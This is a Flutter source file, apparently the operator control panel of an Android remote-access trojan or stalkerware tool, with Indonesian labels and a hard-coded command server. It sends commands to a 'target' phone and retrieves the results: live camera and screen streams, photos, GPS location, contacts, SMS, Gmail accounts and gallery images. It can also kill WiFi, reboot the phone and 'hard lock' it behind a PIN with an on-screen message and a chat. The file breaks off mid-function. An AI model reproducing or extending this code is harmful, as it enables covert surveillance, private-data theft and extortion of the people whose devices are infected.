// lib/control_panel.dart
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'theme.dart';

class ControlPanelPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlPanelPage({super.key, this.targetDevice, this.role = 'owner'});
  @override
  State<ControlPanelPage> createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage> {
  static const _kBase = 'http://www.rexylegal.rxpedia.web.id:2053';

  static const Set<String> _needPoll = {
    'take_photo', 'get_screen', 'get_location', 'track_gps',
    'get_contacts', 'dump_contacts', 'get_gmails', 'get_sms', 'get_gallery',
  };

  bool _sending = false;

  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  void _toast(String m, {Color? c}) {
    if (!mounted) return;
    final p = context.theme;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c ?? p.surfaceAlt,
      content: Text(m,
          style: TextStyle(
              fontWeight: FontWeight.w600,
              fontSize: 13,
              color: p.textPrimary)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.zero,
      ),
    ));
  }

  Future<void> _cmd(String cmd,
      {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('ID target tidak valid');
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          HapticFeedback.lightImpact();
          _toast('Terkirim', c: context.theme.success.withOpacity(0.85));
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) _toast('Target offline');
      }
    } catch (e) {
      if (!silent) _toast('Koneksi gagal');
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0;
    bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) {
              _onResponse(cmd, d['data']);
              got = true;
            }
          }
        }
      } catch (_) {}
    }
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isNotEmpty) _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isNotEmpty) _imgDialog(b, 'Screenshot');
        break;
      case 'get_location':
      case 'track_gps':
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts':
      case 'dump_contacts':
        _contactsSheet(d['contacts'] as List? ?? []);
        break;
      case 'get_gmails':
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        _smsSheet(d['sms'] as List? ?? []);
        break;
      case 'get_gallery':
        _gallerySheet(d['images'] as List? ?? []);
        break;
    }
  }

  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) {
        _liveTimer?.cancel();
        return;
      }
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
  }

  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? '',
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': 'owner',
          'text': text.trim(),
          'time': TimeOfDay.now().format(context),
        }));
    _scrollChat();
    try {
      await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    final p = context.theme;

    return Scaffold(
      backgroundColor: p.bg,
      extendBodyBehindAppBar: true,
      body: Stack(
        fit: StackFit.expand,
        children: [
          _buildBackground(p),
          SafeArea(
            child: Column(
              children: [
                _buildAppBar(p),
                _buildBannerImage(p),
                Expanded(
                  child: ListView(
                    padding: const EdgeInsets.fromLTRB(14, 6, 14, 40),
                    children: [
                      if (_liveOn) _buildLivePreview(p),
                      _buildSection(p, 'LIVE STREAM',
                          'Real-time camera & layar target', [
                        _SquareBtn(
                          label: 'Live Camera',
                          desc: 'Streaming kamera',
                          icon: Icons.videocam_rounded,
                          color: p.danger,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _showCamPicker((side) {
                              _startLive('live_camera_start', side);
                              _showLiveDialog();
                            });
                          },
                        ),
                        _SquareBtn(
                          label: 'Live Screen',
                          desc: 'Streaming layar',
                          icon: Icons.desktop_windows_rounded,
                          color: p.info,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _startLive('live_screen_start', '');
                            _showLiveDialog();
                          },
                        ),
                      ]),
                      _buildSection(p, 'CAMERA & VISUAL',
                          'Foto, screenshot, wallpaper', [
                        _SquareBtn(
                          label: 'Take Photo',
                          desc: 'Foto kamera target',
                          icon: Icons.camera_alt_rounded,
                          color: const Color(0xFFF59E0B),
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _showCamPicker(
                                (s) => _cmd('take_photo', extra: s));
                          },
                        ),
                        _SquareBtn(
                          label: 'Screenshot',
                          desc: 'Tangkap layar',
                          icon: Icons.screenshot_monitor,
                          color: p.info,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('get_screen');
                          },
                        ),
                        _SquareBtn(
                          label: 'Wallpaper',
                          desc: 'Ganti wallpaper',
                          icon: Icons.wallpaper_rounded,
                          color: p.info,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _inputDialog('Set Wallpaper', 'Image URL',
                                (v) => _cmd('set_wallpaper', extra: v));
                          },
                        ),
                        _SquareBtn(
                          label: 'Strobe ON',
                          desc: 'Kedipkan flash',
                          icon: Icons.flash_on_rounded,
                          color: const Color(0xFFF59E0B),
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('flash_strobe');
                          },
                        ),
                        _SquareBtn(
                          label: 'Strobe OFF',
                          desc: 'Matikan strobe',
                          icon: Icons.flash_off_rounded,
                          color: p.textMuted,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('stop_strobe');
                          },
                        ),
                      ]),
                      _buildSection(p, 'INTELLIGENCE',
                          'Data dari HP target', [
                        _SquareBtn(
                          label: 'Contacts',
                          desc: 'Dump kontak',
                          icon: Icons.contacts_rounded,
                          color: p.danger,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('get_contacts');
                          },
                        ),
                        _SquareBtn(
                          label: 'GPS',
                          desc: 'Lacak lokasi',
                          icon: Icons.my_location_rounded,
                          color: p.success,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('get_location');
                          },
                        ),
                        _SquareBtn(
                          label: 'Gmail',
                          desc: 'Ambil akun Gmail',
                          icon: Icons.account_circle_rounded,
                          color: p.info,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('get_gmails');
                          },
                        ),
                        _SquareBtn(
                          label: 'SMS',
                          desc: 'Baca SMS',
                          icon: Icons.sms_rounded,
                          color: p.success,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('get_sms');
                          },
                        ),
                        _SquareBtn(
                          label: 'Notification',
                          desc: 'Notif terbaru',
                          icon: Icons.notifications_rounded,
                          color: const Color(0xFFF59E0B),
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _fetchNotif();
                          },
                        ),
                        _SquareBtn(
                          label: 'Gallery',
                          desc: 'Foto galeri',
                          icon: Icons.photo_library_rounded,
                          color: p.info,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('get_gallery', extra: '5');
                          },
                        ),
                      ]),
                      _buildSection(p, 'AUDIO & NETWORK',
                          'Kontrol audio & jaringan', [
                        _SquareBtn(
                          label: 'Play Audio',
                          desc: 'Putar suara URL',
                          icon: Icons.play_circle_rounded,
                          color: const Color(0xFFF59E0B),
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _inputDialog('Play Audio', 'MP3 URL',
                                (v) => _cmd('play_audio', extra: v));
                          },
                        ),
                        _SquareBtn(
                          label: 'Stop Audio',
                          desc: 'Hentikan audio',
                          icon: Icons.stop_circle_rounded,
                          color: p.textMuted,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('stop_audio');
                          },
                        ),
                        _SquareBtn(
                          label: 'Vibrate',
                          desc: 'Getarkan target',
                          icon: Icons.vibration_rounded,
                          color: p.info,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('vibrate_loop');
                          },
                        ),
                        _SquareBtn(
                          label: 'Open URL',
                          desc: 'Buka link',
                          icon: Icons.open_in_browser,
                          color: p.info,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _inputDialog('Open URL', 'https://...',
                                (v) => _cmd('open_url', extra: v));
                          },
                        ),
                        _SquareBtn(
                          label: 'Kill WiFi',
                          desc: 'Matikan WiFi',
                          icon: Icons.wifi_off_rounded,
                          color: p.success,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('kill_wifi');
                          },
                        ),
                      ]),
                      _buildSection(p, 'LOCK & CHAT',
                          'Kunci HP target & chat 2 arah', [
                        _SquareBtn(
                          label: 'Lock Live',
                          desc: 'Kunci + chat',
                          icon: Icons.lock_rounded,
                          color: p.danger,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _lockLiveDialog();
                          },
                        ),
                        _SquareBtn(
                          label: 'Lock Device',
                          desc: 'Kunci layar',
                          icon: Icons.lock_outline_rounded,
                          color: const Color(0xFFF59E0B),
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _lockChatDialog();
                          },
                        ),
                        _SquareBtn(
                          label: 'Hard Lock',
                          desc: 'Kunci + PIN',
                          icon: Icons.enhanced_encryption_rounded,
                          color: p.danger,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _inputDialog('Lock Device',
                                'Pesan di layar lock', (msg) {
                              _inputDialog('PIN Unlock', '4 digit PIN',
                                  (pin) {
                                _cmd('hard_lock', extra: '$msg|$pin');
                              },
                                  isNumber: true, hint: '1234');
                            });
                          },
                        ),
                        _SquareBtn(
                          label: 'Unlock',
                          desc: 'Buka kunci',
                          icon: Icons.lock_open_rounded,
                          color: p.success,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('unlock');
                          },
                        ),
                      ]),
                      _buildChatBox(p),
                      _buildSection(p, 'DEVICE CONTROL',
                          'Kontrol sistem target', [
                        _SquareBtn(
                          label: 'Restart',
                          desc: 'Reboot HP target',
                          icon: Icons.restart_alt_rounded,
                          color: const Color(0xFFF59E0B),
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _confirmRestart(p);
                          },
                        ),
                        _SquareBtn(
                          label: 'Wake Up',
                          desc: 'Bangunkan layar',
                          icon: Icons.wb_sunny_rounded,
                          color: p.success,
                          onTap: () {
                            HapticFeedback.mediumImpact();
                            _cmd('force_open');
                          },
                        ),
                      ]),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ============ BACKGROUND ============
  Widget _buildBackground(AppPalette p) {
    return Stack(
      fit: StackFit.expand,
      children: [
        Container(color: p.bg),
        CustomPaint(
          painter: _GridPainter(color: Colors.white.withOpacity(0.05)),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: const Alignment(0, -0.6),
              radius: 0.9,
              colors: [
                Colors.white.withOpacity(0.08),
                Colors.transparent,
              ],
            ),
          ),
        ),
      ],
    );
  }

  // ============ APP BAR ============
  Widget _buildAppBar(AppPalette p) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 8),
      child: Row(
        children: [
          GestureDetector(
            onTap: () {
              HapticFeedback.selectionClick();
              if (_liveOn) _stopLive();
              Navigator.pop(context);
            },
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: p.surfaceAlt,
                border: Border.all(color: Colors.white, width: 2),
              ),
              child: Icon(Icons.arrow_back_ios_new,
                  color: p.textPrimary, size: 16),
            ),
          ),
          const Spacer(),
          if (_liveOn)
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
              margin: const EdgeInsets.symmetric(horizontal: 4),
              decoration: BoxDecoration(
                color: p.danger.withOpacity(0.15),
                border: Border.all(color: Colors.white, width: 2),
              ),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(width: 6, height: 6, color: p.danger),
                  const SizedBox(width: 5),
                  Text('$_fps fps',
                      style: TextStyle(
                          color: p.danger,
                          fontSize: 11,
                          fontWeight: FontWeight.bold)),
                ],
              ),
            ),
          if (_sending)
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 8),
              child: SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(
                    strokeWidth: 2, color: p.textPrimary),
              ),
            ),
          GestureDetector(
            onTap: () {
              HapticFeedback.selectionClick();
              setState(() {});
              _cmd('force_open', silent: true);
            },
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: p.surfaceAlt,
                border: Border.all(color: Colors.white, width: 2),
              ),
              child: Icon(Icons.refresh_rounded,
                  color: p.textPrimary, size: 20),
            ),
          ),
        ],
      ),
    );
  }

  // ============ BANNER ============
  Widget _buildBannerImage(AppPalette p) {
    return Container(
      height: 140,
      width: double.infinity,
      margin: const EdgeInsets.fromLTRB(14, 4, 14, 12),
      decoration: BoxDecoration(
        border: Border.all(color: Colors.white, width: 2),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.8),
            offset: const Offset(5, 5),
            blurRadius: 0,
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.zero,
        child: Stack(
          fit: StackFit.expand,
          children: [
            Image.asset(
              'assets/images/mmk.jpg',
              fit: BoxFit.cover,
              errorBuilder: (_, __, ___) => Container(
                color: p.surfaceAlt,
                child: Center(
                  child: Icon(Icons.image_outlined,
                      color: p.textMuted, size: 40),
                ),
              ),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    Colors.transparent,
                    Colors.black.withOpacity(0.8),
                  ],
                ),
              ),
            ),
            Positioned(
              bottom: 14,
              left: 16,
              right: 16,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    _model,
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 0.4,
                    ),
                  ),
                  const SizedBox(height: 5),
                  Row(
                    children: [
                      Container(
                        width: 8,
                        height: 8,
                        color: _liveOn
                            ? const Color(0xFFF87171)
                            : p.success,
                      ),
                      const SizedBox(width: 6),
                      Expanded(
                        child: Text(
                          'Battery: $_battery%  •  $_id',
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.9),
                            fontSize: 11,
                            fontWeight: FontWeight.w500,
                          ),
                          overflow: TextOverflow.ellipsis,
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ============ LIVE PREVIEW ============
  Widget _buildLivePreview(AppPalette p) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 20),
      child: Container(
        height: 200,
        decoration: BoxDecoration(
          color: p.surfaceAlt,
          border: Border.all(color: Colors.white, width: 2),
          boxShadow: [
            BoxShadow(
              color: Colors.white.withOpacity(0.35),
              blurRadius: 18,
              spreadRadius: 1,
            ),
          ],
        ),
        child: Stack(
          fit: StackFit.expand,
          children: [
            if (_frame != null)
              Image.memory(_frame!,
                  fit: BoxFit.contain,
                  gaplessPlayback: true,
                  filterQuality: FilterQuality.low)
            else
              Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    CircularProgressIndicator(
                        color: p.textPrimary, strokeWidth: 2),
                    const SizedBox(height: 10),
                    Text('Waiting for frames...',
                        style: TextStyle(
                            color: p.textTertiary, fontSize: 11)),
                  ],
                ),
              ),
            Positioned(
              top: 10,
              left: 10,
              child: Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(
                  color: Colors.black.withOpacity(0.7),
                  border: Border.all(color: Colors.white, width: 1.5),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      color: const Color(0xFFF87171),
                    ),
                    const SizedBox(width: 5),
                    Text(_liveTitle,
                        style: const TextStyle(
                            color: Colors.white,
                            fontSize: 10,
                            fontWeight: FontWeight.bold)),
                  ],
                ),
              ),
            ),
            Positioned(
              top: 10,
              right: 10,
              child: GestureDetector(
                onTap: () {
                  HapticFeedback.selectionClick();
                  _stopLive();
                },
                child: Container(
                  padding: const EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.7),
                    border: Border.all(color: Colors.white, width: 1.5),
                  ),
                  child: const Icon(Icons.close,
                      color: Colors.white, size: 16),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ============ SECTION ============
  Widget _buildSection(
      AppPalette p, String title, String sub, List<_SquareBtn> buttons) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 24),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.only(left: 4, bottom: 12),
            child: Row(
              children: [
                Container(
                  width: 3,
                  height: 16,
                  color: Colors.white,
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        title,
                        style: TextStyle(
                          color: p.textPrimary,
                          fontSize: 13,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                      const SizedBox(height: 2),
                      Text(
                        sub,
                        style: TextStyle(
                          color: p.textTertiary,
                          fontSize: 10,
                          fontWeight: FontWeight.w500,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          GridView.builder(
            shrinkWrap: true,
            physics: const NeverScrollableScrollPhysics(),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 3,
              crossAxisSpacing: 10,
              mainAxisSpacing: 10,
              childAspectRatio: 0.95,
            ),
            itemCount: buttons.length,
            itemBuilder: (_, i) => _buildSquareBtn(p, buttons[i]),
          ),
        ],
      ),
    );
  }

  // ============ SQUARE BUTTON ============
  Widget _buildSquareBtn(AppPalette p, _SquareBtn b) {
    return GestureDetector(
      onTap: b.onTap,
      child: Container(
        padding: const EdgeInsets.all(8),
        decoration: BoxDecoration(
          color: p.surfaceAlt,
          border: Border.all(color: Colors.white, width: 2),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.8),
              offset: const Offset(3, 3),
              blurRadius: 0,
            ),
          ],
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            Container(
              width: 42,
              height: 42,
              decoration: BoxDecoration(
                color: b.color.withOpacity(0.15),
                border: Border.all(color: b.color, width: 1.5),
              ),
              child: Icon(b.icon, color: b.color, size: 22),
            ),
            const SizedBox(height: 10),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 4),
              child: Text(
                b.label,
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: p.textPrimary,
                  fontSize: 11,
                  fontWeight: FontWeight.w800,
                  letterSpacing: 0.2,
                  height: 1.15,
                ),
                maxLines: 2,
                overflow: TextOverflow.ellipsis,
              ),
            ),
            const SizedBox(height: 4),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 4),
              child: Text(
                b.desc,
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: p.textTertiary,
                  fontSize: 9,
                  fontWeight: FontWeight.w500,
                  height: 1.15,
                ),
                maxLines: 2,
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ============ CHAT BOX ============
  Widget _buildChatBox(AppPalette p) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 24),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.only(left: 4, bottom: 12),
            child: Row(
              children: [
                Container(
                  width: 3,
                  height: 16,
                  color: Colors.white,
                ),
                const SizedBox(width: 10),
                Text(
                  'CHAT TARGET',
                  style: TextStyle(
                    color: p.textPrimary,
                    fontSize: 13,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
          ),
          Container(
            height: 180,
            decoration: BoxDecoration(
              color: p.surfaceAlt,
              border: Border.all(color: Colors.white, width: 2),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.8),
                  offset: const Offset(3, 3),
                  blurRadius: 0,
                ),
              ],
            ),
            child: _chat.isEmpty
                ? Center(
                    child: Text('Belum ada pesan',
                        style: TextStyle(
                            color: p.textTertiary, fontSize: 11)))
                : ListView.builder(
                    controller: _chatScroll,
                    padding: const EdgeInsets.all(10),
                    itemCount: _chat.length,
                    itemBuilder: (_, i) {
                      final m = _chat[i];
                      final isOwner = m['from'] == 'owner';
                      return Align(
                        alignment: isOwner
                            ? Alignment.centerRight
                            : Alignment.centerLeft,
                        child: Container(
                          margin: const EdgeInsets.symmetric(vertical: 3),
                          padding: const EdgeInsets.symmetric(
                              horizontal: 12, vertical: 8),
                          constraints: BoxConstraints(
                              maxWidth:
                                  MediaQuery.of(context).size.width * 0.7),
                          decoration: BoxDecoration(
                            color: isOwner ? p.primary : p.bg,
                            border: Border.all(
                                color: Colors.white, width: 1.5),
                          ),
                          child: Column(
                            crossAxisAlignment: isOwner
                                ? CrossAxisAlignment.end
                                : CrossAxisAlignment.start,
                            children: [
                              Text(m['text'] ?? '',
                                  style: TextStyle(
                                      color: isOwner
                                          ? p.onPrimary
                                          : p.textPrimary,
                                      fontSize: 12,
                                      fontWeight: FontWeight.w500)),
                              const SizedBox(height: 2),
                              Text(m['time'] ?? '',
                                  style: TextStyle(
                                      color: isOwner
                                          ? p.onPrimary.withOpacity(0.7)
                                          : p.textMuted,
                                      fontSize: 9)),
                            ],
                          ),
                        ),
                      );
                    }),
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              Expanded(
                child: TextField(
                  controller: _chatCtrl,
                  style: TextStyle(color: p.textPrimary, fontSize: 13),
                  decoration: InputDecoration(
                    hintText: 'Ketik pesan...',
                    hintStyle:
                        TextStyle(color: p.textMuted, fontSize: 12),
                    filled: true,
                    fillColor: p.surfaceAlt,
                    contentPadding: const EdgeInsets.symmetric(
                        horizontal: 14, vertical: 10),
                    border: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: Colors.white, width: 2),
                    ),
                    enabledBorder: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: Colors.white, width: 2),
                    ),
                    focusedBorder: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: Colors.white, width: 2),
                    ),
                  ),
                  onSubmitted: _sendChat,
                ),
              ),
              const SizedBox(width: 8),
              GestureDetector(
                onTap: () {
                  HapticFeedback.selectionClick();
                  _sendChat(_chatCtrl.text);
                },
                child: Container(
                  padding: const EdgeInsets.all(11),
                  decoration: BoxDecoration(
                    color: p.primary,
                    border: Border.all(color: Colors.white, width: 2),
                  ),
                  child: Icon(Icons.send_rounded,
                      color: p.onPrimary, size: 16),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  // ============ DIALOGS ============
  void _showLiveDialog() {
    final p = context.theme;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: p.bg,
          insetPadding: const EdgeInsets.all(6),
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.zero,
          ),
          child: Container(
            decoration: BoxDecoration(
              border: Border.all(color: Colors.white, width: 2),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 14, vertical: 10),
                  decoration: BoxDecoration(
                    color: p.surfaceAlt,
                    border: const Border(
                      bottom: BorderSide(color: Colors.white, width: 2),
                    ),
                  ),
                  child: Row(
                    children: [
                      Container(
                          width: 8,
                          height: 8,
                          color: p.danger),
                      const SizedBox(width: 8),
                      Text('LIVE — $_liveTitle',
                          style: TextStyle(
                              color: p.textPrimary,
                              fontSize: 12,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 0.5)),
                      const Spacer(),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 8, vertical: 3),
                        decoration: BoxDecoration(
                          color: p.success.withOpacity(0.15),
                          border: Border.all(
                              color: Colors.white, width: 1.5),
                        ),
                        child: Text('$_fps fps',
                            style: TextStyle(
                                color: p.success,
                                fontSize: 10,
                                fontWeight: FontWeight.bold)),
                      ),
                    ],
                  ),
                ),
                Container(
                  constraints: BoxConstraints(
                      maxHeight: MediaQuery.of(context).size.height * 0.52),
                  color: p.surfaceAlt,
                  child: _frame != null
                      ? Image.memory(_frame!,
                          fit: BoxFit.contain,
                          gaplessPlayback: true,
                          filterQuality: FilterQuality.low)
                      : const SizedBox(
                          height: 180,
                          child: Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                CircularProgressIndicator(
                                    color: Colors.white, strokeWidth: 2),
                                SizedBox(height: 10),
                                Text('Waiting for frames...',
                                    style: TextStyle(
                                        color: Colors.white70,
                                        fontSize: 11)),
                              ],
                            ),
                          ),
                        ),
                ),
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: p.surfaceAlt,
                    border: const Border(
                      top: BorderSide(color: Colors.white, width: 2),
                    ),
                  ),
                  child: Row(
                    children: [
                      Expanded(
                        child: OutlinedButton.icon(
                          style: OutlinedButton.styleFrom(
                            side: const BorderSide(
                                color: Colors.white, width: 2),
                            shape: const RoundedRectangleBorder(
                              borderRadius: BorderRadius.zero,
                            ),
                          ),
                          icon: Icon(Icons.cameraswitch_rounded,
                              color: p.textSecondary, size: 15),
                          label: Text('Switch',
                              style: TextStyle(
                                  color: p.textSecondary, fontSize: 11)),
                          onPressed: () {
                            HapticFeedback.selectionClick();
